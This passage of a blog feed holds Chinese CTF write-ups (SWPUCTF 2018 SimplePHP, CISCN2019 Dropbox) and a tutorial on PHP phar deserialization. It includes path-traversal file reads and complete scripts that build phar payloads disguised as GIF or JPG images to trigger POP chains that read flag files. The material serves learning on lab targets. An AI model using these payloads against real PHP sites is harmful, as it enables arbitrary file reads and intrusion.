src="/2021/11/12/Linux/image-20211121234948834.png" alt="image-20211121234948834"></p><p><img src="/2021/11/12/Linux/image-20211122000239414.png" alt="image-20211122000239414"></p><p><img src="/2021/11/12/Linux/image-20211122001630415.png" alt="image-20211122001630415"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2018 SimplePHP_0x50-0x5F</title>
      <link href="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/"/>
      <url>/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/</url>
      
        <content type="html"><![CDATA[<p>如图，只有两个功能点，查看文件和上传文件</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215628202.png" alt="image-20211107215628202"></p><p>上传文件功能点只能上传图片。</p><p>点击查看链接观察url</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=</a></p><p>尝试在file后加一些东西</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=index.php">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=index.php</a></p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215818863.png" alt="image-20211107215818863"></p><p>surprise!</p><p>继续，依次读取各个页面的源码</p><p>file.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt; </code></pre><p>function.php</p><pre><code class="php">&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;        &#125;public function __wakeup()&#123;    if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;        echo &quot;hacker~&quot;;        $this-&gt;source = &quot;index.php&quot;;    &#125;&#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt;</code></pre><p>首先观察敏感函数，我们发现了file_get_contents()，如何利用它呢，我们尝试寻找可以反序列的点。</p><p>但是本文中并没unserialize，这时候我们就可以采用phar://协议，可以达到反序列化的效果。</p><p>下面我们就要考虑，如何利用file_get_contens()这个敏感函数。</p><p>反序列化，最重要的就算里面的一些魔术方法，我们可以进行调用。</p><p>__toString  在echo一个类的时候调用</p><p>__get   未定义的属性或没有权限访问的属性被访问时该方法会被调用</p><p>下面我们来尝试构建pop利用链。</p><p>我们全局搜索$value这个变量，发现它是由get穿过来的</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107220543645.png" alt="image-20211107220543645"></p><p> 我们的目标是什么呢？</p><p>使$value可控！</p><p>我们再全局搜索$key并没有发现可以传入的地方，那么说明它不受我们控制。</p><p>那我们就要突破这个点。</p><p>如何构造，使它受我们控制。</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107220958104.png" alt="image-20211107220958104"></p><p>我们可以使用这个魔术方法：</p><p>当我们在Test()这个类中调用一个不存在的属性的时候就会调用它，因此我们可以通过这个方法来传入我们想要的东西。</p><p>那么如何调用Test()呢？</p><p>我们可以发现：</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107221351753.png" alt="image-20211107221351753"></p><p>Test()类中不存在source，我们可以令str[‘str’] = new Test() 来调用。</p><p>而调用__toString，又需要echo这个类</p><p>我们可以利用这里</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107221800425.png" alt="image-20211107221800425"></p><p>好了，上面我们都是逆推，现在我们可以理一下pop链的顺序。</p><p>调用C1e4r()中的魔术方法__destruct  ——-    调用Show()中的 toString()  ———     传入Test调用不存在的属性从而调用 get</p><p>pop链代码如下:</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$a = new C1e4r();$b = new Show();$c = new Test();$a-&gt;str = $b;$b-&gt;str[&#39;str&#39;] = $c; //因为这里会调用source,从而会调用下边的source，所以下边的params也要接受$source$this-&gt;params[$source] = &#39;/var/www/html/f1ag.php&#39;;@unlink(&quot;sakura.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;sakura.txt&quot;, &quot;sakura&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>放在本地环境，访问，会生成一个sakura.phar文件</p><p>发现无法上传，将后缀改为.gif</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223436308.png" alt="image-20211107223436308"></p><p>上传后。</p><p>访问</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/upload%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E5%90%8D">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/upload可以获得文件名</a></p><p>然后利用phar解析</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=phar://upload/c8875103fcefc5560e4783a36e5faa18.jpg">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=phar://upload/c8875103fcefc5560e4783a36e5faa18.jpg</a></p><p>获得flag</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223535835.png" alt="image-20211107223535835"></p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223555802.png" alt="image-20211107223555802"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> phar协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 华北赛区 Day1 Web1 Dropbox _0x41-0x4F</title>
      <link href="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/"/>
      <url>/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/</url>
      
        <content type="html"><![CDATA[<p>题目给出的是一个登录框，并且有注册操作</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005613695.png" alt="image-20211028005613695"></p><p>我们可以先注册个账号登录下</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005651708.png" alt="image-20211028005651708"></p><p>有上传文件的功能，尝试文件上传，发现写死了，只允许图片上传。</p><p>那我们先上传个图片看一看</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005810078.png" alt="image-20211028005810078"></p><p>增加了两个功能，下载和删除</p><p>抓包来看一看</p><pre><code>POST /download.php HTTP/1.1Host: dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 26Origin: http://dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81Connection: closeReferer: http://dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81/index.phpCookie: UM_distinctid=17ba73558f3490-0c95ed277ed4498-4c3f217f-144000-17ba73558f4710; PHPSESSID=ad225e350fb42f426122effecd7c8b7cfilename=w5w.jpg</code></pre><p>这里有个关键点filename=w5w.jpg，我们可以尝试将w5w.jpg改为别的文件名称</p><p>首先改为 ../../index.php</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011042791.png" alt="image-20211028011042791"></p><p>成功读取到了index.php的源码。</p><p>这时候尝试盲猜路径读取flag，并没有什么结果。那就读取下其他源码看一看吧</p><p>依次读取了</p><p>index.php,download.php,delete.php,class.php</p><p>index.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;?&gt;&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION[&#39;sandbox&#39;]);$a-&gt;Name();$a-&gt;Size();?&gt;</code></pre><p>这个里面没有什么有价值的东西</p><p>class.php</p><pre><code class="php">&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db = $db;    &#125;    public function user_exist($username) &#123;        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count = $stmt-&gt;num_rows;        if ($count === 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password = sha1($password . &quot;SiAchGHmFx&quot;);        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password = sha1($password . &quot;SiAchGHmFx&quot;);        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect === $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files = array();        $this-&gt;results = array();        $this-&gt;funcs = array();        $filenames = scandir($path);        $key = array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key = array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file = new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] = array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table = &#39;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .= &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) &#123;            $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;/th&gt;&#39;;        &#125;        $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#39;;        $table .= &#39;&lt;/thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename =&gt; $result) &#123;            $table .= &#39;&lt;tr&gt;&#39;;            foreach ($result as $func =&gt; $value) &#123;                $table .= &#39;&lt;td class=&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;/td&gt;&#39;;            &#125;            $table .= &#39;&lt;td class=&quot;text-center&quot; filename=&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#39;;            $table .= &#39;&lt;/tr&gt;&#39;;        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename = $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size = filesize($this-&gt;filename);        $units = array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;</code></pre><p>很多函数，最关键的是我们发现了 file_get_contents,这应该是题目的突破点</p><p>download.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file = new File();$filename = (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123;    Header(&quot;Content-type: application/octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo &quot;File not exist&quot;;&#125;?&gt;</code></pre><p>这里可以看到flag被过滤了，所以我们是无法直接读取flag的</p><p>delete.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file = new File();$filename = (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(&quot;Content-type: application/json&quot;);    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);    echo json_encode($response);&#125; else &#123;    Header(&quot;Content-type: application/json&quot;);    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);    echo json_encode($response);&#125;?&gt;</code></pre><p>存在任意文件下载漏洞，相应也存在任意文件删除漏洞。这里的意思不过返回True与False，没有发现什么有用的地方。</p><p>接下来我们来审计一下代码。</p><p>利用点：</p><pre><code class="php">public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;</code></pre><p>看一下哪些地方调用了close函数</p><p>download.php中的</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011750225.png" alt="image-20211028011750225"></p><p>class.php的user类里面存在</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011814557.png" alt="image-20211028011814557"></p><p>这里执行的实际是关闭数据库的操作，但是有趣的是它和我们需要调用的函数重名。</p><p>download.php存在过滤，无法使用，所以我们尝试使用class.php中的魔术方法__destruct()来调用</p><p>如何调用__destruct()魔术方法呢，也就是如何调用对象呢，必须使用反序列化</p><p>但是整个代码中并没有出现过unserialize()这个函数，所以我们并不能直接进行序列化。</p><p>这时候就可以利用phar://伪协议，可以不依赖unserialize()直接进行反序列化操作.</p><p>关于phar的讲解可以看另外一篇博客：</p><p><a href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p>审计代码，我们可以发现一个很有趣的魔术方法：</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028012434528.png" alt="image-20211028012434528"></p><p>它在什么时候调用呢？</p><p>这个方法用来监视一个对象中的其它方法。如果你试着调用一个对象中不存在的方法，__call 方法将会被自动调用</p><p>这里__call的代码的意思就是如果调用的对象不存在，就会把这个函数写入$this-&gt;funcs,并且遍历文件，让每一个文件执行一遍这个函数。</p><p>因此我们的思路就清晰了一点。</p><p>首先反序列化一个类，这个类不存在close()方法(如果存在的话就不需要这么复杂了)，然后对这个类调用close()方法，因为它不存在，所以会调用__call魔术方法，call魔术方法就可以调用close方法，从而完成file_get_contents函数的利用。</p><p>所以操作就是：</p><p>反序列化$user</p><p>调用完成，对象被销毁时，调用函数__destruct魔术方法</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011814557.png" alt="image-20211028011814557"></p><p>使$user -&gt; db = FileList()</p><p>FileList这个类调用close(),不存在，调用__call方法，调用close()</p><p>接下来就可以来构建pop链：</p><pre><code class="php">&lt;?phpclass User &#123;public $db;public function __construct() &#123;        $this-&gt;db = new FileList();    &#125;&#125;class FileList &#123;        private $files;    private $results;    private $funcs;    public function __construct() &#123;        $this-&gt;files = array(new File());        $this-&gt;results = array();        $this-&gt;funcs = array();    &#125;&#125;class File &#123;    public $filename = &#39;/flag.txt&#39;;&#125;$user = new User;@unlink(&quot;sakura.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($user); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;sakura.txt&quot;, &quot;sakura&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>运行得到sakura.phar文件，修改后缀为sakura.jpg，上传</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014454461.png" alt="image-20211028014454461"></p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014549020.png" alt="image-20211028014549020"></p><p>访问delete.php</p><p>注意为什么不访问download.php来实行攻击？</p><p>这里要注意一个细节：</p><p>download.php中存在</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014231785.png" alt="image-20211028014231785"></p><p>ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”); 这个函数执行后，我们通过Web只能访问当前目录、/etc和/tmp三个目录，所以只能在delete.php中利用payload，而不是download.php，否则访问不到沙箱内的上传目录。</p><p>访问delete.php,使用phar进行反序列化，成功得到flag</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014632248.png" alt="image-20211028014632248"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phar反序列化漏洞</title>
      <link href="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。<br> 这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。</p><h1 id="关于流包装"><a href="#关于流包装" class="headerlink" title="关于流包装"></a>关于流包装</h1><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br> 例如常见的</p><pre><code class="php">include(&#39;php://filter/read=convert.base64-encode/resource=index.php&#39;);include(&#39;data://text/plain;base64,xxxxxxxxxxxx&#39;);</code></pre><p><code>phar://</code>也是流包装的一种</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>phar由四个部分组成，分别是stub、manifest describing the  contents、 the file contents、 [optional] a signature for verifying Phar  integrity (phar file format only)</p><p>stub:标识作用，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件；</p><p>manifest describing the contents:其实可以理解为phar文件本质上是一种压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/d8f9d72a6059252d260b20a9a98db93d5bb5b918.jpeg" alt="img"></p><p> the file contents:这里指的是被压缩文件的内容；</p><p>[optional] a signature for verifying Phar integrity (phar file format only):签名，放在结尾；</p><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p><p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p><pre><code class="php">&lt;?phpclass TestObject &#123;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new TestObject();$o -&gt; data=&#39;sakura&#39;;$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>访问一下，发现同目录下生成了一个.phar后缀的文件(如果这步无法创建，请修改php.ini的配置，设置phar.readonly = off 并去掉前面的分号)</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027213811961.png" alt="image-20211027213811961"></p><p>打开：</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215216183.png" alt="image-20211027215216183"></p><p>发现写入的内容已经被序列化。</p><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20180908164943-2151deae-b344-1.png" alt="img"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>phar_fan.php</p><pre><code class="php">&lt;?phpclass TestObject&#123;    function __destruct()    &#123;        echo $this -&gt; data;   // TODO: Implement __destruct() method.    &#125;&#125;include(&#39;phar://phar.phar&#39;);?&gt;</code></pre><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215532641.png" alt="image-20211027215532641"></p><p>我们来简要说明下整个调用流程：</p><p>访问 phar_fun.php这个文件</p><p>执行incleude代码</p><p>解析phar文件</p><p>将里面的meta-data反序列化，在上述代码中也就是TestObject这个对象。</p><p>对象销毁，调用魔术方法__destruct()</p><p>执行echo语句完成攻击。</p><h1 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h1><p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><pre><code class="php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;sakura.phar&quot;);    $phar = new Phar(&quot;sakura.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头    $o = new TestObject();    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest    